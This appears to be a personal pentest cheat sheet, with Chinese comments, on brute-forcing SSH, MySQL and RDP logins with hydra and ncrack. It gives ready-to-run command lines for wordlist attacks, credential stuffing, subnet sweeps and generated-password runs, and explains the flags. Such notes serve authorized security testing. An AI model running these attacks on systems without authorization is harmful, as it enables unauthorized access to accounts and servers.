## hydra

**ssh**

sudo hydra -l root -P wordlist.TXT ssh：//192.168.136.142

**mysql**

```sh
-l <user_string>
-L <user_file>
-p <password_string>
-P <password_file>

# 爆破mysql
hydra -l root -P ./password.txt -t 1 -e n -f -v 192.168.43.17 mysql -w 1
hydra -l root -P ./password.txt -t 2 -e n -f -v 192.168.43.17 mysql
hydra -L ./user.txt -P ./password.txt -t 2 -e n -f -v 192.168.43.17 mysql

# 爆破ssh
hydra -l serlon -P pass.txt 192.168.0.227 ssh     # 知道用户名不知道密码
hydra -l jan -P /opt/rockyou.txt ssh://10.10.100.180 # 知道用户名不知道密码
hydra -L userlist.txt -p 123456 192.168.0.227 ssh # 知道密码不知道用户名
hydra -l admin -p password 192.168.0.0/24 ssh     # 知道用户名和密码但不知道ip
hydra -C default.txt 192.168.0.227                # 知道一组成对的用户名和密码来撞库
hydra -L logins.txt -P pws.txt -M target.txt ssh  # 都不知道
hydra -l wenber -V -x 3:3:1 rdp://127.0.0.1:3389
## -x MIN:MAX:CHARSET  3 到 3 个字符, 1为数字
### 'a' for lowercase letters, 'A' for uppercase letters, '1' for numbers, and for all others, just add their real representation.
### -x 3:5:a  generate passwords from length 3 to 5 with all lowercase letters
### -x 5:8:A1 generate passwords from length 5 to 8 with uppercase and numbers
### -x 1:3:/  generate passwords from length 1 to 3 containing only slashes
### -x 5:5:/%,.-  generate passwords with length 5 which consists only of /%,.-

```

| param   | Description                                                                     |
| ------- | ------------------------------------------------------------------------------- |
| -f      | exit after the first found login/password pair (per host if -M)                 |
| -F      | exit after the first found login/password pair for any host (for usage with -M) |
| -C FILE | colon separated "login:pass" format, instead of -L/-P options                   |
| -e nsr  | "n" for null password, additional checks,                                       |
|         | "s" try login as pass                                                           |
|         | "r" try the reverse login as pass                                               |

## rdp/hydra

```sh
hydra -L user.txt -P pwd.txt 172.22.9.26 rdp -F -vV -e ns
hydra 192.168.50.210 rdp -l admin -p 123456 -V -F
hydra rdp://192.168.1.1:3389 -l admin -p 123456 -V -F
```

## rdp/御剑RDP爆破工具

## rdp/ncrack 3389 rdp 爆破

```sh
ncrack -p 3389 -v -user admin -pass 123456 192.168.52.0/24
ncrack -p 3389 -v -user admin -P /usr/share/wordlists/rockyou.txt 192.95.xx.xx
ncrack -p 3389 -v -user admin -pass 123456Aa@@ 192.168.52.143

# -T<0-5> 越高越快
ncrack -p 3389 -v -user admin -P ./6位数字.txt 192.168.52.143 -T2 -oN output.txt
```
